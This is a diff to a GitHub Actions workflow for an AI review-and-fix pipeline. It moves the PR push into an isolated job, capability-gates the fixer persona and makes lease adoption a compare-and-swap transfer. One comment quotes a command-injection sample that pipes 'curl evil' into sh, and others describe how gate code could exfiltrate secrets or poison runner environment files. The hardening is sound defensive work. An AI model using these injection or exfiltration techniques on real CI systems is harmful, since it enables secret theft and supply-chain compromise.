@@ -117,6 +117,11 @@ jobs:
       routing: ${{ steps.policy.outputs.routing }}
       model_chain: ${{ steps.policy.outputs.model_chain }}
       account_pool: ${{ steps.policy.outputs.account_pool }}
+      # [#285] The system-prompt persona for the model step. review = the `--role review` reviewer;
+      # fix = the SOURCE ISSUE's own live-re-derived route persona, but ONLY when the target's
+      # routing DECLARES that persona `fix_capable = true` (a mutation lane cannot run a
+      # verdict-only brief) — otherwise the `--role impl` implementer (see the resolution + its
+      # capability gate in the `policy` step).
       agent: ${{ steps.policy.outputs.agent }}
       gate_profile: ${{ steps.policy.outputs.gate_profile }}
       arm_auto_merge: ${{ steps.policy.outputs.arm_auto_merge }}
@@ -629,14 +634,92 @@ jobs:
           # PR. An empty result is never a fallback to the provider-wide chain: it empties `chain`,
           # which routes this run to the `unresolvable` job and a human.
           route_error = ""
+          route_agent = ""
           if mode == "fix":
               try:
-                  route_chain = list(policy_resolve.resolve(
-                      target_repo, list(issue_labels), policy_doc, routing)["model_chain"])
+                  route = policy_resolve.resolve(
+                      target_repo, list(issue_labels), policy_doc, routing)
+                  route_chain = list(route["model_chain"])
+                  route_agent = route["agent"]
+                  if not isinstance(route_agent, str) or not route_agent.strip():
+                      raise ValueError("the source issue's route names no agent")
               except (ValueError, TypeError, KeyError) as exc:
                   route_error = f"{exc.__class__.__name__}: {exc}"
                   route_chain = []
+                  route_agent = ""
               wanted = dispatch_claim._route_constrained_fix_chain(wanted, route_chain)
+          # ---- [#285] THE FIX PERSONA RIDES THE ROUTE — BUT NEVER THE VERDICT-ONLY REVIEWER ----
+          # `policy["agent"]` above came from `--role impl`, i.e. routing.toml's `role = "impl"`
+          # row — the target's IMPLEMENTER persona, resolved without reference to the PR's trust
+          # tier, so a docs-only or CI PR was fixed under the general implementer's brief. The
+          # route this lane already re-derives LIVE (one block up, from the SOURCE ISSUE's own
+          # labels) names the persona the worker actually implemented under, so taking the persona
+          # from that same resolution keeps the fix leg no more privileged than the leg it is
+          # fixing. worker-live.sh resolves it to `.claude/agents/<agent>.md` in the target.
+          #
+          # ADOPTION IS CAPABILITY-GATED, NOT NAME-GATED ([#285] review r2). A `[[route]]` may
+          # name a VERDICT-ONLY persona: on THIS repo the security override
+          # (`review-loop`/`dispatch`/`worker`/...) routes to `registry-reviewer`, whose checked-in
+          # brief is read-only (Read/Glob/Grep), mutates nothing but `.review-verdict.json` and
+          # says its job is "never a fix". Handing THAT brief to the `worker-live.sh fix` step
+          # instructs the fixer not to edit the PR at all: a compliant model produces no diff and a
+          # model that does edit is violating its own system prompt.
+          #
+          # So the persona must be DECLARED able to mutate: the target's routing table carries an
+          # `[agents.<name>] fix_capable` row per persona and `agent_fix_capable` reads it, FAIL
+          # CLOSED (undeclared / malformed / anything but the boolean `true` -> not adoptable).
+          # Round 1 instead compared the route's agent NAME to the persona the `role = "review"`
+          # row selects, and that inference is unsound BOTH ways: a SECOND verdict-only persona
+          # under any other name was adopted, and repointing the review row would have made the
+          # reviewer adoptable with its brief unchanged. Capability is a property of the BRIEF, so
+          # it is declared beside the routes, not derived from one route's choice of name.
+          #
+          # WHO CAN WRITE IT: the same party, in the same file, at the same protected tip that
+          # already writes the `[[route]]` model chains and `match_labels` this step reads — the
+          # `target-routing` checkout of the target's DEFAULT branch. It adds no new author and no
+          # new trust anchor; a party that could forge a capability row could already re-point the
+          # route itself.
+          #
+          # A refusal falls back to `policy["agent"]`, the `--role impl` implementer — no wider
+          # than the lane had before this change, and named in the audit line below. It grants
+          # nothing: the alternative, parking every trust-surface fix to a human, would disable the
+          # fix lane for the majority of this repo's PRs. But "retain a known fix-capable persona"
+          # has to be KNOWN, and [#285] review r3 measured what "known" was worth here: the
+          # fallback was refused only on an EXPLICIT `fix_capable = false`, so a target that had
+          # OPTED IN to the capability table and then omitted its `role = "impl"` persona — renamed
+          # it, or wrote a malformed row/value — published that undeclared persona to
+          # `worker-live.sh fix` as if it were known. Omission was the permissive case at the FINAL
+          # selection point, which is the one place the value actually reaches a model. So
+          # `agent_fix_refused` turns on whether the target declares capabilities AT ALL: no
+          # `[agents]` table -> exactly the pre-declaration behaviour, table present -> the
+          # fallback must be declared `fix_capable = true` like any other persona, and anything
+          # less fails this job closed — same class as the docs-only-model refusal above, a
+          # routing-document defect a human must fix.
+          #
+          # REVIEW MODE NEVER ENTERS THIS: `route_agent` is empty there (no route is consumed), so
+          # the persona stays the `--role review` reviewer — which is DECLARED not fix-capable and
+          # must stay selectable, hence the `mode == "fix"` guard on the fallback refusal. A
+          # fix-lane resolver refusal also leaves `route_agent` empty — and that refusal has
+          # ALREADY emptied `chain` above, so that run is parked to a human by the `unresolvable`
+          # job and no model consumes this value at all.
+          persona_source = "role-resolved"
+          resolved_agent = policy["agent"]
+          if route_agent:
+              if policy_resolve.agent_fix_capable(routing, route_agent):
+                  resolved_agent = route_agent
+                  persona_source = "source-issue route"
+              else:
+                  persona_source = ("role-resolved (route persona REFUSED: the target's routing "
+                                    "does not declare it fix_capable)")
+          # The check is on the persona this job PUBLISHES, after the fallback is settled — the
+          # final selection point. An adopted route persona already satisfies it; a fallback the
+          # target never declared does not, so a capability-enabled target cannot reach
+          # `worker-live.sh fix` through silence.
+          if mode == "fix" and policy_resolve.agent_fix_refused(routing, resolved_agent):
+              raise SystemExit(
+                  "the fix persona this lane resolved is not declared fix_capable = true in the "
+                  "target's routing, which declares capabilities for other personas: a mutating "
+                  "lane runs a DECLARED fixer or nobody")
           models = routing.get("models", {})
           chain = []
           for alias in wanted:
@@ -689,7 +772,7 @@ jobs:
               "routing": policy["routing"],
               "model_chain": ",".join(chain),
               "account_pool": ",".join(policy["account_pool"]),
-              "agent": policy["agent"],
+              "agent": resolved_agent,
               "gate_profile": policy["gate_profile"],
               "arm_auto_merge": str(policy["arm_auto_merge"]).lower(),
               "max_review_rounds": str(policy["max_review_rounds"]),
@@ -709,6 +792,9 @@ jobs:
                     f"{','.join(route_chain) or 'NONE'}"
                     f"{f' (resolver refusal: {route_error})' if route_error else ''}")
           print(f"{mode} chain for {impl_provider}-implemented PR: {','.join(chain) or 'UNRESOLVABLE'}")
+          # [#285] Audit line: WHICH persona this lane resolved and WHERE it came from — including
+          # a route persona REFUSED for not being DECLARED fix-capable by the target's routing.
+          print(f"{mode} agent: {resolved_agent} ({persona_source})")
           PY
 
   claim:
@@ -897,12 +983,32 @@ jobs:
           PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
         run: |
           set -euo pipefail
-          prefix="review:"
-          [[ "$MODE" == fix ]] && prefix="fix:"
+          # Adoption is a CAS OWNERSHIP TRANSFER, not a read-only look (issue #363 — the review-lane
+          # sibling of the impl lane's #132, ported from worker.yml's adopt step): --adopt swaps the
+          # lease holder from the dispatcher to THIS run and re-bases its expiry to now + the lane's
+          # full budget, so (a) two runs can never both own one claim — a re-run attempt is handed
+          # the SAME claim_id input, and the old read-only --inspect let it validate and then
+          # release a lease its live sibling was working under, (b) a queued lane whose dispatcher
+          # lease already expired is refused (exit 3, `set -e` fails the step) instead of
+          # resurrecting a possibly-reallocated slot, and (c) the lease cannot expire mid-run.
+          # The run-named holder this writes is ALSO what lets groom-leases renew the lease on run
+          # liveness (select-and-claim.HOLDER_RUN / LEASE_HOLDING_WORKFLOWS, issue #1128) rather
+          # than only on its TTL — a dispatcher-shaped `@dispatch-<id>.<n>` holder names no run.
+          # The refreshed ttl is this job's self-claim ttl for the same lane; both literals are
+          # pinned to dispatch-claim.py REVIEW_TTL / FIX_TTL by `_review_fix_workflow_values`, so
+          # editing one side alone turns that self-test RED — change both, or don't change either.
+          if [[ "$MODE" == fix ]]; then
+            prefix="fix:"; adopt_ttl=6300
+          else
+            prefix="review:"; adopt_ttl=4200
+          fi
+          holder="$prefix$TARGET_REPO#$PR_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
           python3 registry/scripts/select-and-claim.py \
-            --inspect "$CLAIM_ID" \
+            --adopt "$CLAIM_ID" \
             --repo "$GITHUB_REPOSITORY" \
-            --expected-holder-prefix "$prefix$TARGET_REPO#$PR_NUMBER@" > "$RUNNER_TEMP/adopt.json"
+            --expected-holder-prefix "$prefix$TARGET_REPO#$PR_NUMBER@" \
+            --holder "$holder" \
+            --ttl "$adopt_ttl" > "$RUNNER_TEMP/adopt.json"
           if ! python3 - "$RUNNER_TEMP/adopt.json" <<'PY'
           import hashlib
           import json
@@ -965,6 +1071,11 @@ jobs:
           print(f"dispatcher lease adopted: model={model}, claim={claim_id[:8]}")
           PY
           then
+            # Safe to release now: --adopt already CAS-transferred this lease to OUR run holder, so
+            # this release frees only our own lease — never a concurrent attempt's live one (issue
+            # #363: the old --inspect path released a claim it did not own). A not-adoptable /
+            # already-adopted claim never reaches here — --adopt exits 3 and `set -e` fails the
+            # step first.
             python3 registry/scripts/select-and-claim.py \
               --release "$CLAIM_ID" \
               --repo "$GITHUB_REPOSITORY" || true
@@ -1044,11 +1155,19 @@ jobs:
       fix_made_changes: ${{ steps.fix.outputs.fix_made_changes }}
       injection_detected: ${{ steps.fix.outputs.injection_detected }}
       gate_outcome: ${{ steps.gate.outcome }}
-      pushed: ${{ steps.push.outcome == 'success' && 'true' || 'false' }}
-      # Issue #156: the exact commit the fix pushed. The fix-outcome revalidates the live head
-      # against the head THIS run produced (this sha on a push, else the unchanged reviewed head)
-      # so a stale re-review/needs-user never acts on a head another push produced.
-      pushed_sha: ${{ steps.push.outputs.pushed_sha }}
+      # [issue #91 review r2] The fix COMMIT, sealed and recorded BEFORE the hostile gate step
+      # starts, and the second parent a conflict repair merged. The runner captures these step
+      # outputs while this runner is still clean, so nothing the gate does can alter them; the
+      # isolated `publish` job below binds the bundle it downloads to this SHA before it pushes.
+      # `pushed`/`pushed_sha` moved to that job with the push itself.
+      staged_sha: ${{ steps.stage.outputs.staged_sha }}
+      staged_merge_head: ${{ steps.stage.outputs.staged_merge_head }}
+      # Host-derived target identity, bound by the pre-model `target` step from this App's own
+      # `/users/<slug>[bot]` record and the target repo record — never from PR text. The publisher
+      # re-asserts the staged commit's committer against this and does not have to trust the
+      # bundle for it.
+      target_bot_login: ${{ steps.target.outputs.bot_login }}
+      target_default_branch: ${{ steps.target.outputs.default_branch }}
       # Model-access health (registry #32): the sanitized exit CLASS of the review/fix model launch,
       # recorded by the separate no-target-code `model_health` job (success or failure), plus the
       # sanitized session-limit reset time (review defect #9; empty for every other class).
@@ -1119,7 +1238,13 @@ jobs:
           permission-issues: write
           permission-pull-requests: write
 
-      - name: Mint fix-scoped App token (target contents write for the push)
+      # [issue #91 review r2] NO TARGET CONTENTS WRITE — this token used to carry
+      # contents+workflows write so the post-gate `push` step could use it, which put a
+      # push-capable credential in the same job as target-controlled gate code. The push moved to
+      # the isolated `publish` job, which mints those scopes on a runner that has never executed
+      # target code; what remains here is what the PRE-gate steps actually need (identity probe,
+      # target checkout, round record, follow-up issues).
+      - name: Mint fix-scoped App token (no target contents write)
         id: app-token-fix
         if: ${{ inputs.mode == 'fix' }}
         uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
@@ -1128,10 +1253,9 @@ jobs:
           private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
           owner: ${{ needs.resolve.outputs.target_owner }}
           repositories: ${{ needs.resolve.outputs.target_name }}
-          permission-contents: write
+          permission-contents: read
           permission-issues: write
           permission-pull-requests: write
-          permission-workflows: write
 
       - name: Verify target App identity and default branch
         id: target
@@ -1620,6 +1744,68 @@ jobs:
           WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
         run: bash ../registry/scripts/worker-live.sh fix
 
+      # [issue #91 review r2] SEAL THE FIX BEFORE THE HOSTILE GATE. worker-live.sh commits the
+      # fixer's work locally — no token, git hooks neutralised — writes the single commit into a
+      # git bundle, and RESTORES the pre-gate index so `run_gate`'s `git diff`/`git status`
+      # selectors still see exactly the tree the model left (a committed tree would make the gate
+      # vacuous). The commit SHA is recorded as a step output here, while this runner is still
+      # clean, and the isolated `publish` job binds the artifact it downloads to that SHA.
+      #
+      # ORDERING CONSEQUENCE, stated because it is a real change: the refusals the old post-gate
+      # push made (head drifted since dispatch, a model-edited `.beads`, an empty tree) now happen
+      # HERE, so the gate is skipped rather than run-then-discarded. The outcome stays counted and
+      # bounded — `gate_outcome` reads `skipped`, which `fix-outcome` already treats as the
+      # not-green case and marks `gatefail` — and the commonest of them, a drifted head, still
+      # exits ahead of that at fix-outcome's own live-head revalidation.
+      - name: Seal the fix commit as an inert bundle (pre-gate, no token)
+        id: stage
+        if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
+        working-directory: target
+        env:
+          TARGET_DIR: ${{ github.workspace }}/target
+          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
+          TARGET_BOT_LOGIN: ${{ steps.target.outputs.bot_login }}
+          TARGET_BOT_ID: ${{ steps.target.outputs.bot_id }}
+          WORKER_ROOT: ${{ runner.temp }}/registry-worker
+          WORKER_PR_NUMBER: ${{ inputs.pr_number }}
+          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
+          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
+          WORKER_FIX_ROUND: ${{ inputs.review_round }}
+          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
+          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
+        run: bash ../registry/scripts/worker-live.sh stage-fix
+
+      # Uploaded PRE-GATE as well (same reasoning as worker.yml's publish bundle): the artifact
+      # service takes its copy while the runner is clean, so a gate that later rewrites the
+      # on-disk bundle changes nothing the publisher downloads — and if it replaced the artifact
+      # anyway, the pre-gate SHA the publisher binds to refuses it. if-no-files-found: error keeps
+      # a silently empty upload from becoming a silent no-push.
+      - name: Upload the pre-gate fix bundle (inert data only)
+        if: ${{ steps.stage.outcome == 'success' }}
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: fix-bundle-${{ github.run_id }}-${{ github.run_attempt }}
+          path: ${{ runner.temp }}/registry-worker/fix-bundle
+          if-no-files-found: error
+          retention-days: 1
+
+      # [issue #91 review r2] MOVED AHEAD OF THE GATE. Filing the model's declared follow-ups never
+      # depended on the gate outcome (its `if:` reads `steps.fix.outcome` alone), so running it
+      # here costs nothing and removes the second token-bearing step that used to sit after
+      # target-controlled code had executed on this runner.
+      - name: Create declared follow-up issues (discovered out-of-scope work)
+        if: ${{ inputs.mode == 'fix' && steps.fix.outcome == 'success' }}
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ steps.app-token-fix.outputs.token }}
+          WORKER_ROOT: ${{ runner.temp }}/registry-worker
+        run: |
+          set -uo pipefail
+          python3 registry/scripts/worker-issue.py followup \
+            --repo "${{ inputs.target_repo }}" \
+            --issue "${{ needs.resolve.outputs.issue }}" \
+            --spec-file "$WORKER_ROOT/followups.jsonl" || true
+
       # Persist a HOST-SIDE-rotated account credential so the next claim still authenticates
       # (issue #596). Rotation happens in worker-prep's pre-flight refresh, NOT in the container:
       # the credential file is bind-mounted read-only (issue #134), so the CLI's own in-place
@@ -1760,45 +1946,166 @@ jobs:
           TARGET_DIR: ${{ github.workspace }}/target
           GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
           WORKER_PACKAGES: ${{ needs.resolve.outputs.packages }}
+          # [issue #91] Same quarantine as worker.yml's gate step, which this lane had not
+          # inherited. The fix lane runs the SAME `worker-live.sh gate` on the SAME target
+          # checkout, so it executes the same target-controlled build scripts and tests as the
+          # runner user — and it is the WEAKER position of the two, because a write-capable
+          # GH_TOKEN step (`push`) still follows the gate in this job. So the runner command files
+          # go: $GITHUB_ENV / $GITHUB_PATH are the cross-step primitives (BASH_ENV, LD_PRELOAD,
+          # an attacker binary ahead of the system python3), and $GITHUB_STEP_SUMMARY /
+          # $GITHUB_OUTPUT are the exfiltration ones ($GITHUB_STEP_SUMMARY is retained and
+          # rendered on the run page, and base64 defeats GitHub's exact-secret masking). Nothing
+          # legitimate is lost: the gate reports through its exit status alone, and only
+          # `steps.gate.outcome` is read downstream — never `steps.gate.outputs`.
+          #
+          # [issue #91 review r1] AND IT IS NOT A BOUNDARY. Rebinding these four variables is
+          # ENV-LEVEL only: it removes the channel from every actor that reaches a command file the
+          # documented way (the environment), which is every build script, test harness and action
+          # that writes one. It is NOT containment. The gate's code runs as the SAME runner user,
+          # the runner's REAL command files still sit under $RUNNER_TEMP/_runner_file_commands/
+          # (set_env_*, add_path_*, step_summary_*), and code that enumerates that directory can
+          # append to them directly — the runner consumes them at step end whatever this step's
+          # environment said. A workflow cannot prevent a same-uid write; only a real boundary can.
+          #
+          # [issue #91 review r2] AND THAT BOUNDARY NOW EXISTS HERE TOO. This lane used to be the
+          # weaker of the two — a write-capable GH_TOKEN `push` step, plus the follow-up issue
+          # step, ran AFTER the gate on this runner, so command-file poisoning had a token-bearing
+          # target to aim at. Both are gone: the follow-ups moved ahead of the gate and the push
+          # moved into the isolated `publish` job below, on a fresh runner, taking only host-derived
+          # inputs and a commit SHA recorded before this step ran. NOTHING TOKEN-BEARING FOLLOWS THE
+          # GATE in this job (#575's property, now asserted live on BOTH workflow files by
+          # `_tokens_after_gate`), and this job's own App token no longer carries target contents
+          # write at all. Read the four lines below as defence-in-depth behind that, never as
+          # containment.
+          GITHUB_ENV: ${{ runner.temp }}/gate-quarantine/env
+          GITHUB_PATH: ${{ runner.temp }}/gate-quarantine/path
+          GITHUB_OUTPUT: ${{ runner.temp }}/gate-quarantine/output
+          GITHUB_STEP_SUMMARY: ${{ runner.temp }}/gate-quarantine/step-summary
         run: bash ../registry/scripts/worker-live.sh gate
 
-      - name: Commit and push the fix to the PR head branch
-        id: push
-        if: ${{ inputs.mode == 'fix' && steps.gate.outcome == 'success' }}
-        working-directory: target
-        env:
-          GH_TOKEN: ${{ steps.app-token-fix.outputs.token }}
-          TARGET_DIR: ${{ github.workspace }}/target
-          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
-          TARGET_BOT_LOGIN: ${{ steps.target.outputs.bot_login }}
-          TARGET_BOT_ID: ${{ steps.target.outputs.bot_id }}
-          WORKER_ROOT: ${{ runner.temp }}/registry-worker
-          WORKER_PR_NUMBER: ${{ inputs.pr_number }}
-          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
-          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
-          WORKER_FIX_ROUND: ${{ inputs.review_round }}
-          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
-          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
-        run: bash ../registry/scripts/worker-live.sh push-fix
-
-      - name: Create declared follow-up issues (discovered out-of-scope work)
-        if: ${{ inputs.mode == 'fix' && steps.fix.outcome == 'success' }}
-        continue-on-error: true
-        env:
-          GH_TOKEN: ${{ steps.app-token-fix.outputs.token }}
-          WORKER_ROOT: ${{ runner.temp }}/registry-worker
-        run: |
-          set -uo pipefail
-          python3 registry/scripts/worker-issue.py followup \
-            --repo "${{ inputs.target_repo }}" \
-            --issue "${{ needs.resolve.outputs.issue }}" \
-            --spec-file "$WORKER_ROOT/followups.jsonl" || true
+      # NOTHING TOKEN-BEARING FOLLOWS THE GATE (issues #575, #91). The commit/push to the PR head
+      # branch used to live right here, with a contents/workflows-capable App token, after the gate
+      # had already executed target-controlled build scripts and tests. It now runs in the isolated
+      # `publish` job below, which executes no target code and reconstructs nothing: it pushes the
+      # exact commit OBJECT sealed into the bundle BEFORE the gate, bound to the SHA this job
+      # recorded pre-gate.
 
       - name: Cleanup isolated worker state
         if: ${{ always() }}
         env:
           WORKER_ROOT: ${{ runner.temp }}/registry-worker
         run: rm -rf -- "$WORKER_ROOT"
+
+  # ISSUE #91 (review round 2) — the isolated fix publisher, extending issue #575's worker-lane
+  # split to this lane. The `run` job executes the target's own gate (arbitrary target-controlled
+  # build scripts and tests) as the runner user; it used to then commit and push to the PR head
+  # branch ON THAT SAME RUNNER with a contents/workflows-capable App token. Gated target code could
+  # therefore aim at that token through every same-uid surface the gate has: the runner's real
+  # command files under $RUNNER_TEMP/_runner_file_commands/ (poisoning $GITHUB_ENV/$GITHUB_PATH for
+  # the later step, which the gate step's own env rebinding cannot prevent), the sibling
+  # `registry/` checkout the publisher script is read from, `.git/hooks`, and any process the gate
+  # detaches.
+  #
+  # This job closes all of them the way `outcome`/`model_health`/`release` already do: a FRESH
+  # runner that executes NO target code and NO target-writable script. The model's work crosses as
+  # INERT DATA — a git bundle holding one commit, sealed pre-gate — and nothing in it is executed:
+  # `git fetch` from the bundle, then `git push` of the object.
+  #
+  # FAIL-CLOSED ORDERING: the bundle is bound to the PRE-GATE recorded commit SHA (and its parents,
+  # committer identity and .beads policy re-asserted) BEFORE the App token is minted, so a
+  # substituted, oversized, unreadable or drifted artifact never causes a push-capable token to
+  # exist. Every refusal leaves `pushed` false, and `fix-outcome` in the `outcome` job then records
+  # exactly what it records for a gate that did not pass: no reviewed-sha advance, and the sweep
+  # re-plans on the next tick. There is deliberately NO fallback that pushes from the run runner.
+  publish:
+    name: Push the gated fix to the PR head (no target code runs here)
+    # staged_sha is non-empty only when the PRE-GATE seal succeeded, so a review run, a fix that
+    # made no changes, a detected injection, or a run that died before the fixer skips this job
+    # entirely (empty outputs -> pushed=false).
+    if: ${{ always() && needs.claim.outputs.acquired == 'true' && inputs.mode == 'fix' && needs.run.outputs.staged_sha != '' && needs.run.outputs.gate_outcome == 'success' }}
+    needs: [resolve, claim, run]
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
+    # `dispatch-secrets` environment (deployment-branch policy: default branch only).
+    environment: dispatch-secrets
+    permissions:
+      contents: read
+    outputs:
+      pushed: ${{ steps.push.outcome == 'success' && 'true' || 'false' }}
+      # Issue #156: the exact commit the fix pushed. The fix-outcome revalidates the live head
+      # against the head THIS run produced (this sha on a push, else the unchanged reviewed head)
+      # so a stale re-review/needs-user never acts on a head another push produced.
+      pushed_sha: ${{ steps.push.outputs.pushed_sha }}
+    steps:
+      - name: Checkout registry (pinned, no persisted token)
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          path: registry
+          persist-credentials: false
+
+      # The artifact is keyed on `github.run_id`.`github.run_attempt`, so a PARTIAL re-run (this
+      # job alone, with the run job's results preserved) finds no artifact for the new attempt and
+      # fails CLOSED to no push — never a push of a bundle another attempt sealed. A full re-run
+      # re-executes the fixer and seals a fresh one.
+      - name: Download the pre-gate fix bundle (pinned)
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
+        with:
+          name: fix-bundle-${{ github.run_id }}-${{ github.run_attempt }}
+          path: ${{ runner.temp }}/fix-bundle
+
+      # Minted only after the artifact is on disk, and it is the FIRST push-capable token to exist
+      # anywhere in this run: the `run` job's fix-scoped token is contents-READ. Same scopes the
+      # old in-run push used, on a runner that has never executed target code.
+      - name: Mint push-scoped App token for the verified fix (no target code has run here)
+        id: app-token-publish
+        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
+        with:
+          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
+          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
+          owner: ${{ needs.resolve.outputs.target_owner }}
+          repositories: ${{ needs.resolve.outputs.target_name }}
+          permission-contents: write
+          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
+          # branches touching .github/workflows/*.
+          permission-workflows: write
+
+      # Checked out at the DISPATCHED head sha — never at a ref name that could have moved, and
+      # never at the run job's post-gate worktree, which is exactly the artefact this job exists to
+      # distrust. fetch-depth: 0 because a push from a shallow clone can be refused by the remote.
+      - name: Checkout the target PR head (pinned, no persisted token)
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          repository: ${{ inputs.target_repo }}
+          ref: ${{ needs.resolve.outputs.head_sha }}
+          path: target
+          token: ${{ steps.app-token-publish.outputs.token }}
+          fetch-depth: 0
+          persist-credentials: false
+
+      # worker-live.sh binds the downloaded bundle to the PRE-GATE recorded SHA (and re-asserts the
+      # parents, the committer identity and the per-kind .beads policy) before it pushes anything;
+      # any refusal fails this step, leaves `pushed` false and pushes nothing.
+      - name: Verify the pre-gate bundle and push the fix commit
+        id: push
+        working-directory: target
+        env:
+          GH_TOKEN: ${{ steps.app-token-publish.outputs.token }}
+          TARGET_DIR: ${{ github.workspace }}/target
+          TARGET_DEFAULT_BRANCH: ${{ needs.run.outputs.target_default_branch }}
+          TARGET_BOT_LOGIN: ${{ needs.run.outputs.target_bot_login }}
+          WORKER_ROOT: ${{ runner.temp }}/registry-worker
+          WORKER_FIX_BUNDLE: ${{ runner.temp }}/fix-bundle/fix.bundle
+          # PRE-GATE step outputs of the run job: captured by the runner before the hostile step
+          # started, so nothing the gate did can have altered them.
+          WORKER_STAGED_SHA: ${{ needs.run.outputs.staged_sha }}
+          WORKER_STAGED_MERGE_HEAD: ${{ needs.run.outputs.staged_merge_head }}
+          # Host-derived, from the pre-hostile `resolve` job and the workflow inputs.
+          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
+          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
+          WORKER_FIX_ROUND: ${{ inputs.review_round }}
+          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
+        run: bash ../registry/scripts/worker-live.sh push-fix
 
   # Applies every durable mutation of a review/fix run: the registry verdict record, PR labels
   # and markers, the one-shot arm, and needs-user escalations. It is a SEPARATE job from `run`
@@ -1815,7 +2122,11 @@ jobs:
   # path additionally restores the draft state if the latch mutation fails after `pr ready`.
   outcome:
     name: Apply ${{ inputs.mode }} outcome (no target code runs here)
-    needs: [resolve, claim, run]
+    # [issue #91 review r2] `publish` joins the needs so this job observes the push it now owns.
+    # The `if:` below is unchanged and still keyed on the `run` job alone — a publish that was
+    # skipped or refused must NOT suppress the outcome record, it must be recorded as pushed=false
+    # exactly as a red gate always was.
+    needs: [resolve, claim, run, publish]
     # Issue #560 adds the third admission: a fix run that STAGED NOTHING (verdict_stale_reason
     # non-empty) skips the fix step, so fix_done is 'skipped' and this job used to be skipped with
     # it — which is exactly why the PR kept review:changes and the fix lane re-admitted it forever.
@@ -2091,6 +2402,10 @@ jobs:
           # never interpolated into the run: shell source, where `x"; curl evil|sh; echo "` would
           # execute (issue #199, same class as the provider paths).
           MODEL_ALIAS: ${{ needs.claim.outputs.model }}
+        # [issue #91 review r2] `--pushed`/`--reviewed-sha` come from the isolated `publish` job
+        # now. A SKIPPED or refused publish yields an EMPTY output, so `pushed` is normalised to
+        # the literal 'false' the recorder expects — the same value the old in-run push step
+        # produced whenever the gate did not pass.
         run: |
           python3 registry/scripts/worker-pr.py fix-outcome \
             --repo "${{ inputs.target_repo }}" \
@@ -2102,8 +2417,8 @@ jobs:
             --injection "${{ needs.run.outputs.injection_detected == 'true' && 'true' || 'false' }}" \
             --made-changes "${{ needs.run.outputs.fix_made_changes == 'true' && 'true' || 'false' }}" \
             --gate-outcome "${{ needs.run.outputs.gate_outcome }}" \
-            --pushed "${{ needs.run.outputs.pushed }}" \
-            --reviewed-sha "${{ needs.run.outputs.pushed == 'true' && needs.run.outputs.pushed_sha || needs.resolve.outputs.head_sha }}" \
+            --pushed "${{ needs.publish.outputs.pushed == 'true' && 'true' || 'false' }}" \
+            --reviewed-sha "${{ needs.publish.outputs.pushed == 'true' && needs.publish.outputs.pushed_sha || needs.resolve.outputs.head_sha }}" \
             --issue "${{ needs.resolve.outputs.issue }}"
 
       # Issue #560 — WRONG-LANE SPIN CLOSURE. stage-verdict refused to seed the fixer because no
@@ -2273,7 +2588,11 @@ jobs:
   release:
     name: Always release the review/fix lease
     if: ${{ always() && needs.claim.outputs.acquired == 'true' }}
-    needs: [claim, run]
+    # [issue #91 review r2] `publish` joins the needs for the same reason worker.yml's release
+    # waits on its publisher: the push now happens in a later job, and releasing the lease before
+    # it lands would let the next dispatch tick re-claim this PR and re-plan against a head the
+    # in-flight publisher is about to move.
+    needs: [claim, run, publish]
     runs-on: ubuntu-latest
     timeout-minutes: 10
     permissions:
